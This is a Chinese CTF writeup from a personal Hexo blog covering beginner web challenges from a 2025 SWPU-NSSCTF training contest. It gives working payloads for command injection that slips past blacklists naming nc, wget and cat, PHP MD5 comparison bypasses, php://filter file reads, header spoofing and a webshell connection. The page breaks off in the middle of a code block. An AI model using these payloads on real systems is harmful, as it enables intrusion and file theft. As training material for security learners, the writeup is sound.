@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/blog_head.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/blog_head.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"m21in.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="gift_F12网页源代码搜索flag就有 Do_you_know_http改http头，这里不要用hackbar，老实用burpsuite，hackbar会有点问题做不出来第一步提示Please use ‘WLLM’ browser!">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025 SWPU-NSSCTF 秋季招新入门训练赛writeup">
+<meta property="og:url" content="http://m21in.github.io/87df8320.html">
+<meta property="og:site_name" content="M21in的博客">
+<meta property="og:description" content="gift_F12网页源代码搜索flag就有 Do_you_know_http改http头，这里不要用hackbar，老实用burpsuite，hackbar会有点问题做不出来第一步提示Please use ‘WLLM’ browser!">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="d:\%E7%BD%91%E5%AE%89\%E7%BD%91%E5%AE%89\blog\themes\next\source\images\SPU2025\http_1.png">
+<meta property="og:image" content="d:\%E7%BD%91%E5%AE%89\%E7%BD%91%E5%AE%89\blog\themes\next\source\images\SPU2025\http_2.png">
+<meta property="og:image" content="http://m21in.github.io/D:/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89/blog/themes/next/source/images/SPU2025/webftp_1.png">
+<meta property="og:image" content="http://m21in.github.io/D:/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89/blog/themes/next/source/images/SPU2025/webFTP_2.png">
+<meta property="og:image" content="http://m21in.github.io/D:/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89/blog/themes/next/source/images/SPU2025/MD5_1.png">
+<meta property="og:image" content="http://m21in.github.io/D:/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89/blog/themes/next/source/images/SPU2025/IP_1.png">
+<meta property="og:image" content="http://m21in.github.io/D:/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89/blog/themes/next/source/images/SPU2025/IP_2.png">
+<meta property="og:image" content="http://m21in.github.io/D:/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89/blog/themes/next/source/images/SPU2025/IP_3.png">
+<meta property="og:image" content="http://m21in.github.io/D:/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89/blog/themes/next/source/images/SPU2025/caidao_1.png">
+<meta property="og:image" content="http://m21in.github.io/D:/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89/blog/themes/next/source/images/SPU2025/game.png">
+<meta property="og:image" content="http://m21in.github.io/D:/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89/blog/themes/next/source/images/SPU2025/po_1.png">
+<meta property="og:image" content="http://m21in.github.io/D:/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89/blog/themes/next/source/images/SPU2025/ping_1.png">
+<meta property="og:image" content="http://m21in.github.io/D:/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89/blog/themes/next/source/images/SPU2025/theme_1.png">
+<meta property="og:image" content="http://m21in.github.io/D:/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89/blog/themes/next/source/images/SPU2025/theme_2.png">
+<meta property="article:published_time" content="2025-08-11T14:48:35.000Z">
+<meta property="article:modified_time" content="2025-08-21T08:38:31.078Z">
+<meta property="article:author" content="M21in">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:\%E7%BD%91%E5%AE%89\%E7%BD%91%E5%AE%89\blog\themes\next\source\images\SPU2025\http_1.png">
+
+<link rel="canonical" href="http://m21in.github.io/87df8320.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2025 SWPU-NSSCTF 秋季招新入门训练赛writeup | M21in的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">M21in的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">分享和学习</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">16</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">6</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">14</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://m21in.github.io/87df8320.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/blog_head.jpg#/images/avatar.gif">
+      <meta itemprop="name" content="M21in">
+      <meta itemprop="description" content="用来记录生活和技术的地方">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M21in的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2025 SWPU-NSSCTF 秋季招新入门训练赛writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-08-11 22:48:35" itemprop="dateCreated datePublished" datetime="2025-08-11T22:48:35+08:00">2025-08-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-08-21 16:38:31" itemprop="dateModified" datetime="2025-08-21T16:38:31+08:00">2025-08-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="gift-F12"><a href="#gift-F12" class="headerlink" title="gift_F12"></a>gift_F12</h1><p>网页源代码搜索flag就有</p>
+<h1 id="Do-you-know-http"><a href="#Do-you-know-http" class="headerlink" title="Do_you_know_http"></a>Do_you_know_http</h1><p>改http头，这里不要用hackbar，老实用burpsuite，hackbar会有点问题做不出来<br>第一步提示<br>Please use ‘WLLM’ browser!</p>
+<p>根据提示改网页头user-Agent为WLLM<br><img src="D:\网安\网安\blog\themes\next\source\images\SPU2025\http_1.png"><br>成功后根据提示访问a.php<br><img src="D:\网安\网安\blog\themes\next\source\images\SPU2025\http_2.png"><br>要改成本地IP，加一个X-Forwarded-For头为127.0.0.1就可以<br>最后访问&#x2F;secretttt.php就是flag了</p>
+<h1 id="jicao"><a href="#jicao" class="headerlink" title="jicao"></a>jicao</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>一道简单的php代码审计，get传参json，包含一个json数据 x对应的是wllm，POST传参id为wllmNB</p>
+<p>拿python脚本传个参就行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node7.anna.nssctf.cn:28157/&quot;</span></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;json&quot;</span>: <span class="string">&#x27;&#123;&quot;x&quot;:&quot;wllm&quot;&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;wllmNB&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, params=params, data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+<p>也可以直接在网页传参</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get:</span><br><span class="line">?json=&#123;<span class="string">&quot;x&quot;</span>:<span class="string">&quot;wllm&quot;</span>&#125;</span><br><span class="line">POST:</span><br><span class="line">id=wllmNB</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="WebFTP"><a href="#WebFTP" class="headerlink" title="WebFTP"></a>WebFTP</h1><p><img src="/D:/网安\网安\blog\themes\next\source\images\SPU2025\webftp_1.png"></p>
+<p>登陆页面，常规思路万能密码</p>
+<p>没试出来</p>
+<p>去网上搜了一下，webftp 2011有漏洞，有phpinfo.php这个页面</p>
+<p>访问一下搜索flag就是</p>
+<p><img src="/D:/网安\网安\blog\themes\next\source\images\SPU2025\webFTP_2.png"></p>
+<h1 id="finalrce"><a href="#finalrce" class="headerlink" title="finalrce"></a>finalrce</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Can you see anything?&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; Can you see anything?</span><br></pre></td></tr></table></figure>
+
+<p>过滤很多，但是也有漏网之鱼 nl和tac没有过滤，ls过滤可以用l\s绕过，这个题目网上也有原题，可以照着payload抄</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">l\s /|tee <span class="number">1</span>.txt</span><br></pre></td></tr></table></figure>
+
+<p>后访问1.txt，里面有个很明显的flag文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">a_here_is_a_f1ag</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flllllaaaaaaggggggg</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>
+
+<p>可以tac或者nl查看到flag，但是注意waf里面过滤了la，所以flag文件要加上\绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=tac%<span class="number">20</span>/flllll\aaaaaaggggggg|tee%<span class="number">202</span>.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="ez-SSTI"><a href="#ez-SSTI" class="headerlink" title="ez_SSTI"></a>ez_SSTI</h1><p>fenjing一把梭</p>
+<p>flag在根目录</p>
+<h1 id="奇妙的MD5"><a href="#奇妙的MD5" class="headerlink" title="奇妙的MD5"></a>奇妙的MD5</h1><p>题目问”可曾听闻CTF中一个奇妙的字符串”，这里题目也说是MD5了，这里要记两个知识点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br></pre></td></tr></table></figure>
+
+<p>MD5加密后弱比较等于自身</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br></pre></td></tr></table></figure>
+
+<p>MD5加密后是万能密码</p>
+<p>第二个填空成功来到下一题</p>
+<p><img src="/D:/网安\网安\blog\themes\next\source\images\SPU2025\MD5_1.png"></p>
+<p>直接想到源代码</p>
+<p>果然有</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="variable">$x</span>= <span class="variable">$GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="variable">$y</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span> != <span class="variable">$y</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$x</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$y</span>))&#123;</span><br><span class="line">    ;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>双等于 弱比较 拿数组绕过就可以</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?x[]=<span class="number">1</span>&amp;&amp;y[]=<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>来到最后一关</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;wqh&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;dsy&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;wqh&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dsy&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传参不能相等，md5加密后强相等，数组一样可以用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wqh[]=<span class="number">1</span>&amp;&amp;dsy[]=<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="看看IP"><a href="#看看IP" class="headerlink" title="看看IP"></a>看看IP</h1><p><img src="/D:/网安\网安\blog\themes\next\source\images\SPU2025\IP_1.png"></p>
+<p>点进去是会显示IP地址，但是再次点击时，报错了</p>
+<p><img src="/D:/网安\网安\blog\themes\next\source\images\SPU2025\IP_2.png"></p>
+<p>想到可能是命令执行XFF</p>
+<p><img src="/D:/网安\网安\blog\themes\next\source\images\SPU2025\IP_3.png"></p>
+<p>flag在根目录</p>
+<h1 id="babyRCE"><a href="#babyRCE" class="headerlink" title="babyRCE"></a>babyRCE</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$rce</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hhhhhhacker!!!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>get传参rce，可以用${IFS}绕过，ban了查看文件的命令和flag可以\绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rce=ca\t$&#123;IFS&#125;fla\g.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="ez-ez-php"><a href="#ez-ez-php" class="headerlink" title="ez_ez_php"></a>ez_ez_php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">3</span>) === <span class="string">&quot;php&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>一个RCE传参</p>
+<p>要求传参的file参数前三个是php，才会包含file所指定的文件</p>
+<p>想到filter伪协议，正好符合</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="caidao"><a href="#caidao" class="headerlink" title="caidao"></a>caidao</h1><p><img src="/D:/网安\网安\blog\themes\next\source\images\SPU2025\caidao_1.png"></p>
+<p>题目暗示很明显了， 也可以拿蚁剑连</p>
+<p>密码wllm</p>
+<p>flag在根目录下</p>
+<h1 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;yee&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nop&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;go on&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;let&#x27;s get some 